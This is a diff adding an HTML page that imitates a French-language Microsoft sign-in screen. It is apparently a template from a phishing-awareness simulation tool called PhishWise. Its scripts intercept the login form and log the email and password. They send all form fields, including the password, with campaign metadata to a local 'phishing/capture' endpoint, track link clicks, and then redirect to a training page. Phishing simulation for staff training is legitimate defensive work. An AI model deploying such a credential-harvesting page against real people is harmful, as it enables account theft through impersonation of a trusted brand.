@@ -1,0 +1,444 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter à votre compte</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #323130;
+        }
+        
+        .login-container {
+            background-color: white;
+            padding: 44px;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            margin: 0 24px;
+        }
+        
+        .microsoft-logo {
+            margin-bottom: 32px;
+            text-align: left;
+            margin-left: -40px;
+        }
+        
+        .logo-img {
+            width: 180px;
+            height: auto;
+            max-height: 40px;
+            object-fit: contain;
+        }
+        
+        .sign-in-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #323130;
+        }
+        
+        .sign-in-subtitle {
+            font-size: 15px;
+            color: #605e5c;
+            margin-bottom: 24px;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 32px;
+            padding: 6px 12px;
+            border: 1px solid #605e5c;
+            font-size: 15px;
+            color: #323130;
+            background-color: white;
+            outline: none;
+            transition: border-color 0.1s ease;
+        }
+        
+        .input-field:focus {
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 5px 11px;
+        }
+        
+        .input-field::placeholder {
+            color: #605e5c;
+        }
+        
+        .forgot-password {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .button-container {
+            margin-bottom: 24px;
+        }
+        
+        .sign-in-button {
+            background-color: #0078d4;
+            color: white;
+            border: 1px solid #0078d4;
+            padding: 6px 12px;
+            min-width: 108px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            outline: none;
+            transition: background-color 0.1s ease;
+            position: relative;
+        }
+        
+        .sign-in-button:hover {
+            background-color: #106ebe;
+            border-color: #106ebe;
+        }
+        
+        .sign-in-button:active {
+            background-color: #005a9e;
+            border-color: #005a9e;
+        }
+        
+        .sign-in-button:disabled {
+            background-color: #a19f9d;
+            border-color: #a19f9d;
+            cursor: not-allowed;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .button-text {
+            transition: opacity 0.2s ease;
+        }
+        
+        .sign-in-options {
+            border-top: 1px solid #edebe9;
+            padding-top: 24px;
+        }
+        
+        .create-account {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 16px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .sign-in-methods {
+            font-size: 13px;
+        }
+        
+        .sign-in-methods a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .sign-in-methods a:hover {
+            text-decoration: underline;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .checkbox {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+        
+        .checkbox-label {
+            font-size: 13px;
+            color: #323130;
+            cursor: pointer;
+        }
+        
+        .error-message {
+            color: #a80000;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 24px;
+                margin: 0 16px;
+            }
+            
+            .sign-in-title {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="microsoft-logo">
+            <img src="http://localhost:3000/images/logos/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Office Logo" class="logo-img">
+        </div>
+        
+        <h1 class="sign-in-title">Se connecter</h1>
+        <p class="sign-in-subtitle">à votre compte</p>
+        
+        <form id="loginForm" action="http://localhost:3000/login" method="POST">
+            <div class="input-group">
+                <input type="email" class="input-field" name="email" placeholder="E-mail, téléphone ou nom Skype" required="" autocomplete="username">
+                <div class="error-message" id="emailError">Veuillez entrer une adresse e-mail valide.</div>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" class="input-field" name="password" placeholder="Mot de passe" required="" autocomplete="current-password">
+                <div class="error-message" id="passwordError">Mot de passe incorrect. Réessayez.</div>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" class="checkbox" id="keepSignedIn" name="keepSignedIn">
+                <label for="keepSignedIn" class="checkbox-label">Maintenir la connexion</label>
+            </div>
+            
+            <div class="button-container">
+                <button type="submit" class="sign-in-button" id="loginButton">
+                    <div class="loading-spinner" id="loadingSpinner" style="display: none;"></div>
+                    <span class="button-text" id="buttonText" style="opacity: 1;">Se connecter</span>
+                </button>
+            </div>
+            
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </form>
+        
+        <div class="sign-in-options">
+            <a href="#" class="create-account">Créer un compte Microsoft</a>
+            
+            <div class="sign-in-methods">
+                <a href="#">Options de connexion</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const button = document.getElementById('loginButton');
+            const buttonText = document.getElementById('buttonText');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            
+            // Vérification que les champs sont remplis
+            if (!email || !password) {
+                if (!email) {
+                    document.getElementById('emailError').style.display = 'block';
+                }
+                if (!password) {
+                    document.getElementById('passwordError').style.display = 'block';
+                }
+                return;
+            }
+            
+            // Animation de chargement
+            button.disabled = true;
+            buttonText.style.opacity = '0';
+            loadingSpinner.style.display = 'block';
+            
+            console.log('Tentative de connexion:', { email, password });
+            
+            // Simulation d'une vérification puis redirection vers le portail bancaire
+            setTimeout(() => {
+                // Construction de l'URL avec les paramètres
+                const bankingPortalUrl = 'banking-portal.html' + 
+                    '?email=' + encodeURIComponent(email) + 
+                    '&from=microsoft';
+                
+                // Redirection vers la page du portail bancaire
+                window.location.href = bankingPortalUrl;
+            }, 2000); // Délai de 2 secondes pour l'effet de chargement
+        });
+        
+        // Amélioration de l'UX avec les champs de saisie
+        const inputs = document.querySelectorAll('.input-field');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentNode.querySelector('.error-message').style.display = 'none';
+            });
+        });
+        
+        // Réinitialiser le bouton en cas de retour sur la page
+        window.addEventListener('pageshow', function() {
+            const button = document.getElementById('loginButton');
+            const buttonText = document.getElementById('buttonText');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            
+            button.disabled = false;
+            buttonText.style.opacity = '1';
+            loadingSpinner.style.display = 'none';
+        });
+    </script>
+
+
+
+    <script>
+      (function() {
+        // Custom alert function to replace native alert()
+        window.customAlert = function(message) {
+          console.log('Custom Alert:', message);
+          // You can implement a more sophisticated modal/message box here if needed.
+          // For now, it just logs to console.
+          // Example: alert(message); // If you still want the native alert for simulation
+        };
+
+        console.log('🎯 PhishWise Universal Tracking activated');
+
+        // Wait for DOM to be ready
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', initTracking);
+        } else {
+          initTracking();
+        }
+
+        function initTracking() {
+          // Intercept all forms
+          const forms = document.querySelectorAll('form');
+          console.log('📝 Forms detected:', forms.length);
+
+          forms.forEach(function(form, index) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+              console.log('📋 Form submission intercepted:', index);
+
+              // Collect all form data
+              const formData = new FormData(form);
+              const data = {};
+
+              // Extract data from inputs
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
+              const inputs = form.querySelectorAll('input, select, textarea');
+              inputs.forEach(function(input) {
+                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
+                  if (input.type === 'checkbox' || input.type === 'radio') {
+                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
+                  } else {
+                    data[input.name] = input.value;
+                  }
+                }
+              });
+
+              // Tracking metadata
+              data._campaignId = '68b0e76c76b40ea173252a4b';
+              data._timestamp = new Date().toISOString();
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+              data._formIndex = index;
+              data._formAction = form.action || 'N/A';
+              data._formMethod = form.method || 'GET';
+
+              console.log('📊 Collected data:', data);
+
+              // Send data
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function(response) {
+                console.log('✅ Data sent successfully');
+                // Redirect to learning page
+                window.location.href = 'http://localhost:3000/learning/68b0e76c76b40ea173252a4b';
+              }).catch(function(error) {
+                console.error('❌ Error sending data:', error);
+                // Redirect even on error
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/68b0e76c76b40ea173252a4b';
+                }, 1000);
+              });
+            });
+          });
+
+          // Track link clicks
+          document.addEventListener('click', function(e) {
+            const link = e.target.closest('a');
+            if (link) {
+              const href = link.href;
+              console.log('🔗 Link clicked:', href);
+
+              // Send click event
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '68b0e76c76b40ea173252a4b',
+                  clickedUrl: href,
+                  linkText: link.textContent.trim(),
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+
+          // Track input field interactions (focus)
+          const inputs = document.querySelectorAll('input, textarea, select');
+          inputs.forEach(function(input) {
+            input.addEventListener('focus', function() {
+              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
+            });
+          });
+
+          console.log('🚀 Universal tracking initialized');
+        }
+      })();
+    </script>
+</body></html>
